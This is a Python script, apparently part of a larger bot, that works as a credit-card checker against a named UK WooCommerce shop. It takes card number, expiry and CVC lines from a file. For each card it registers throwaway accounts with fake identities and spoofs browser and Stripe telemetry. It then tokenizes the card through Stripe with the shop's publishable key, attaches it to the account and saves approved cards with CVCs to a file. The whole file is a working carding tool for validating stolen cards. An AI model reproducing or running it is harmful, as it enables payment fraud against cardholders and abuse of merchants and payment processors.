import requests
import urllib.parse
import os
import uuid
import random
import re
from faker import Faker

# ── Site config ───────────────────────────────────────────────────────────────
BASE    = "https://www.propski.co.uk"
PK_KEY  = "pk_live_4kM0zYmj8RdKCEz9oaVNLhvl00GpRole3Q"
_fake   = Faker()
# ─────────────────────────────────────────────────────────────────────────────

# Module-level session state — reused across cards so we don't re-register each time
_session        = None
_add_card_nonce = None
_session_email  = None


def _create_session(proxy=None):
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    })
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    return s


def _get_nonce(url, pattern, session, headers=None):
    try:
        r = session.get(url, headers=headers or {}, timeout=20)
        if r.status_code != 200:
            return None
        m = re.search(pattern, r.text)
        return m.group(1) if m else None
    except Exception:
        return None


def _register_account(session, email):
    try:
        register_nonce = _get_nonce(
            f"{BASE}/my-account/",
            r'name="woocommerce-register-nonce" value="(.*?)"',
            session,
            headers={'referer': f'{BASE}/my-account/'}
        )
        if not register_nonce:
            return False
        data = {
            'email': email,
            'wc_order_attribution_session_entry': f'{BASE}/my-account/',
            'wc_order_attribution_user_agent': session.headers.get('User-Agent'),
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        r = session.post(
            f"{BASE}/my-account/",
            params={'action': 'register'},
            data=data,
            headers={'referer': f'{BASE}/my-account/'},
            timeout=20
        )
        return r.status_code in (200, 302)
    except Exception:
        return False


def _post_billing_address(session, email):
    try:
        url = f"{BASE}/my-account/edit-address/billing/"
        r = session.get(url, headers={'referer': f'{BASE}/my-account/edit-address/'}, timeout=20)
        if r.status_code != 200:
            return False
        m = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', r.text)
        address_nonce = m.group(1) if m else None
        if not address_nonce:
            return False
        data = {
            'billing_first_name': _fake.first_name(),
            'billing_last_name':  _fake.last_name(),
            'billing_company':    '',
            'billing_country':    'AU',
            'billing_address_1':  _fake.street_address(),
            'billing_address_2':  '',
            'billing_city':       'Sydney',
            'billing_state':      'NSW',
            'billing_postcode':   '2000',
            'billing_phone':      '0412345678',
            'billing_email':      email,
            'save_address':       'Save address',
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer':   '/my-account/edit-address/billing/',
            'action':             'edit_address',
        }
        r2 = session.post(url, headers={'origin': BASE, 'referer': url}, data=data, timeout=20)
        return r2.status_code in (200, 302)
    except Exception:
        return False


def _get_add_card_nonce(session):
    try:
        url = f"{BASE}/my-account/add-payment-method/"
        r = session.get(url, headers={'referer': f'{BASE}/my-account/payment-methods/'}, timeout=20)
        if r.status_code != 200:
            return None
        m = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', r.text)
        return m.group(1) if m else None
    except Exception:
        return None


def _init_session(proxy=None):
    """Register a new WooCommerce account and return (session, nonce, email)."""
    email = (f"{_fake.first_name().lower()}"
             f"{_fake.last_name().lower()}"
             f"{random.randint(10,99)}@gmail.com")
    print(f"[ST] Registering new account: {email}")
    s = _create_session(proxy)

    if not _register_account(s, email):
        print("[ST] ❌ Failed to register account")
        return None, None, None

    if not _post_billing_address(s, email):
        print("[ST] ❌ Failed to post billing address")
        return None, None, None

    nonce = _get_add_card_nonce(s)
    if not nonce:
        print("[ST] ❌ Failed to get add-card nonce")
        return None, None, None

    print("[ST] ✅ Session ready")
    return s, nonce, email


# ── Public API — same signatures bott.py expects ─────────────────────────────

def get_setup_intent(proxy=None):
    """
    Step 1 — Bootstrap WooCommerce session.
    Returns (email, nonce) which act as (setup_intent_id, client_secret)
    in the existing bott.py call pattern.
    """
    global _session, _add_card_nonce, _session_email
    try:
        if _session is None or _add_card_nonce is None:
            _session, _add_card_nonce, _session_email = _init_session(proxy)

        if _session is None:
            return None, None

        return _session_email, _add_card_nonce

    except Exception as e:
        print(f"[ST] Error in get_setup_intent: {e}")
        return None, None


def create_payment_method(card_details, proxy=None):
    """
    Step 2 — Tokenize card via Stripe /v1/sources.
    Returns (source_id, source_data) or (None, None) on failure.
    """
    try:
        headers = {
            'authority':          'api.stripe.com',
            'accept':             'application/json',
            'accept-language':    'en-US,en;q=0.9',
            'cache-control':      'no-cache',
            'content-type':       'application/x-www-form-urlencoded',
            'origin':             'https://js.stripe.com',
            'pragma':             'no-cache',
            'referer':            'https://js.stripe.com/',
            'sec-ch-ua':          '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile':   '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest':     'empty',
            'sec-fetch-mode':     'cors',
            'sec-fetch-site':     'same-site',
            'user-agent':         'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                                  '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        data = {
            'referrer':            BASE,
            'type':                'card',
            'owner[email]':        _session_email or 'test@gmail.com',
            'card[number]':        card_details['number'],
            'card[cvc]':           card_details['cvc'],
            'card[exp_month]':     card_details['exp_month'],
            'card[exp_year]':      card_details['exp_year'],
            'guid':                str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
            'muid':                str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
            'sid':                 str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
            'pasted_fields':       'number',
            'payment_user_agent':  'stripe.js/8702d4c73a; stripe-js-v3/8702d4c73a; split-card-element',
            'time_on_page':        str(random.randint(30000, 900000)),
            'client_attribution_metadata[client_session_id]':           str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'cardNumber',
            'client_attribution_metadata[merchant_integration_version]':'2017',
            'key':                 PK_KEY,
        }

        proxies = {"http": proxy, "https": proxy} if proxy else None
        print(f"[ST] Tokenizing card ending in {card_details['number'][-4:]}...")
        resp = requests.post(
            'https://api.stripe.com/v1/sources',
            headers=headers,
            data=urllib.parse.urlencode(data),
            proxies=proxies,
            timeout=30
        )

        if resp.status_code == 200:
            j = resp.json()
            source_id = j.get('id')
            if source_id:
                return source_id, j
            return None, None
        elif resp.status_code == 429:
            print("[ST] Rate limited on tokenize")
            return None, None
        else:
            print(f"[ST] Tokenize failed: {resp.status_code} — {resp.text[:200]}")
            return None, None

    except Exception as e:
        print(f"[ST] Error creating payment method: {e}")
        return None, None


def confirm_setup_intent(setup_intent_id, client_secret, payment_method_id,
                         payment_method_data, card_details, proxy=None):
    """
    Step 3 — Attach source to WooCommerce site via wc_stripe_create_setup_intent.
    Returns (success: bool, response_data: dict)
    """
    global _session, _add_card_nonce, _session_email

    try:
        nonce = client_secret  # client_secret carries the WC nonce from get_setup_intent

        if _session is None:
            print("[ST] No active session for attach step")
            return False, {"error": {"message": "No active session"}}

        headers = {
            'authority':          BASE.replace('https://', ''),
            'accept':             '*/*',
            'accept-language':    'en-US,en;q=0.9',
            'cache-control':      'no-cache',
            'pragma':             'no-cache',
            'sec-ch-ua':          '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile':   '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest':     'empty',
            'sec-fetch-mode':     'cors',
            'sec-fetch-site':     'same-origin',
            'user-agent':         'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                                  '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'content-type':       'application/x-www-form-urlencoded; charset=UTF-8',
            'origin':             BASE,
            'referer':            f'{BASE}/my-account/add-payment-method/',
        }
        data = {
            'stripe_source_id': payment_method_id,
            'nonce':            nonce,
        }

        if proxy:
            _session.proxies.update({"http": proxy, "https": proxy})

        print(f"[ST] Attaching source for card ending in {card_details['number'][-4:]}...")
        r = _session.post(
            f'{BASE}/',
            params={'wc-ajax': 'wc_stripe_create_setup_intent'},
            headers=headers,
            data=data,
            timeout=30
        )

        if r.status_code == 429:
            print("[ST] Rate limited on attach")
            return False, {"error": {"message": "Rate limited"}}

        if r.status_code == 200:
            try:
                payload = r.json()
            except Exception:
                return False, {"error": {"message": "Unparseable response"}}

            status = payload.get("status")

            if status == "success":
                print("[ST] ✅ Card approved")
                save_approved_card(card_details)
                # Nonce is consumed — refresh on next card
                _add_card_nonce = None
                return True, payload

            elif status == "requires_action":
                print("[ST] 3DS required — card live but needs action")
                _add_card_nonce = None
                card_info = payment_method_data.get("card", {})
                if card_info and "payment_method" not in payload:
                    payload["payment_method"] = {
                        "card": {
                            "brand":         card_info.get("brand", ""),
                            "display_brand": card_info.get("brand", ""),
                            "country":       card_info.get("country", ""),
                            "funding":       card_info.get("funding", ""),
                        }
                    }
                return False, payload

            elif status == "error":
                err     = payload.get("error", {})
                msg     = err.get("message", "Unknown error")
                code    = err.get("code", "")
                decline = err.get("decline_code", "")
                print(f"[ST] ❌ Declined — code={code} decline={decline} msg={msg}")

                # Inject card info from source data into error so bott.py
                # can display Brand/Country/Type instead of Unknown
                card_info = payment_method_data.get("card", {})
                if card_info and "payment_method" not in payload.get("error", {}):
                    payload.setdefault("error", {})["payment_method"] = {
                        "card": {
                            "brand":        card_info.get("brand", ""),
                            "display_brand": card_info.get("brand", ""),
                            "country":      card_info.get("country", ""),
                            "funding":      card_info.get("funding", ""),
                        }
                    }
                return False, payload

            else:
                print(f"[ST] Unknown status: {status}")
                return False, payload

        elif r.status_code == 400:
            try:
                payload = r.json()
                msg = payload.get("data", {}).get("error", {}).get("message", "400 error")
            except Exception:
                msg = "400 with unparseable body"
            print(f"[ST] ❌ 400 Declined: {msg}")
            card_info = payment_method_data.get("card", {})
            error_resp = {"error": {"message": msg, "code": "card_declined"}}
            if card_info:
                error_resp["error"]["payment_method"] = {
                    "card": {
                        "brand":         card_info.get("brand", ""),
                        "display_brand": card_info.get("brand", ""),
                        "country":       card_info.get("country", ""),
                        "funding":       card_info.get("funding", ""),
                    }
                }
            return False, error_resp

        else:
            print(f"[ST] Unexpected HTTP {r.status_code}")
            return False, {"error": {"message": f"HTTP {r.status_code}"}}

    except Exception as e:
        print(f"[ST] Error in confirm_setup_intent: {e}")
        return False, str(e)


def save_approved_card(card_details):
    try:
        with open('approved.txt', 'a', encoding='utf-8') as f:
            f.write(
                f"{card_details['number']}|{card_details['exp_month']}|"
                f"{card_details['exp_year']}|{card_details['cvc']} Status: Approved\n"
            )
    except Exception as e:
        print(f"Error saving approved card: {e}")


def check_card(card_details, proxy=None):
    print(f"\n{'='*50}")
    print(f"Checking card: {card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}")
    print(f"{'='*50}")

    setup_intent_id, client_secret = get_setup_intent(proxy=proxy)
    if not setup_intent_id:
        return False

    payment_method_id, payment_method_data = create_payment_method(card_details, proxy=proxy)
    if not payment_method_id:
        return False

    success, result = confirm_setup_intent(
        setup_intent_id,
        client_secret,
        payment_method_id,
        payment_method_data,
        card_details,
        proxy=proxy
    )

    if success:
        print("✅ Success!")
        return True
    else:
        print("❌ Failed")
        return False


def read_cc_file(filename):
    cards = []
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        cards.append({
                            'number':    parts[0],
                            'exp_month': parts[1],
                            'exp_year':  parts[2],
                            'cvc':       parts[3]
                        })
                    else:
                        print(f"Invalid format in line: {line}")
        return cards
    except FileNotFoundError:
        print(f"Error: File {filename} not found.")
        return []


if __name__ == "__main__":
    if os.path.exists('approved.txt'):
        os.remove('approved.txt')

    cards = read_cc_file('cc.txt')

    if not cards:
        print("No cards found")
    else:
        print(f"Found {len(cards)} cards")
        approved_count = 0
        for i, card in enumerate(cards, 1):
            print(f"\nCard {i}/{len(cards)}")
            if check_card(card):
                approved_count += 1

        print(f"\n{'='*50}")
        print(f"Done: {approved_count}/{len(cards)} approved")
        print(f"{'='*50}")
